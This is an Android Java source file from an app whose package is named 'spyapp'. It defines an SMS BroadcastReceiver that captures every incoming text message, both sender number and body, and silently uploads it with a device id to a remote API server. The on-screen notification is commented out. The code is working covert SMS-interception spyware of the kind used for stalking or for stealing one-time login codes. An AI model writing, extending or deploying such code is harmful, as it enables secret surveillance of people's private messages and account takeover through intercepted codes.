package com.extrainch.spyapp;

import static android.content.ContentValues.TAG;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;
import android.widget.Toast;

import com.extrainch.Api.ApiClient;
import com.extrainch.Models.NewMessageModel;
import com.extrainch.Models.NewMessageResponseModel;

import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class ReceiveSms extends BroadcastReceiver {
    ApiClient apiClient;
    public static String idLogs = "";

    @Override
    public void onReceive(Context context, Intent intent) {
        apiClient = ApiClient.getInstance();
        if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            Bundle bundle = intent.getExtras();
            SmsMessage[] msgs = null;
            String msg_from;
            if (bundle != null) {
                try {
                    Object[] pdus = (Object[]) bundle.get("pdus");
                    msgs = new SmsMessage[pdus.length];
                    for (int i = 0; i < msgs.length; i++) {
                        msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
                        msg_from = msgs[i].getOriginatingAddress();
                        String msgBody = msgs[i].getMessageBody();

                        String id = idLogs;
                        String messagesIncoming = msgBody;
                        String phoneNumber = msg_from;

                        NewMessageModel newMessageModel = new NewMessageModel(
                                id,
                                messagesIncoming,
                                phoneNumber
                        );

                        apiClient.getSpyAppApiService().createNewMessage(newMessageModel).enqueue(new Callback<NewMessageResponseModel>() {
                            @Override
                            public void onResponse(Call<NewMessageResponseModel> call, Response<NewMessageResponseModel> response) {
                                if (response.isSuccessful()) {
                                    Log.d(TAG, "Res:" + response.body());
                                }
                            }

                            @Override
                            public void onFailure(Call<NewMessageResponseModel> call, Throwable t) {
                                Log.d(TAG, "Error" + t.getMessage());
                            }
                        });

//                        Toast.makeText(context, "From: " + msg_from + ", Body:" + msgBody, Toast.LENGTH_SHORT).show();
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }
    }

    public static void onIdRecv(String str) {
        idLogs += str;
    }
}
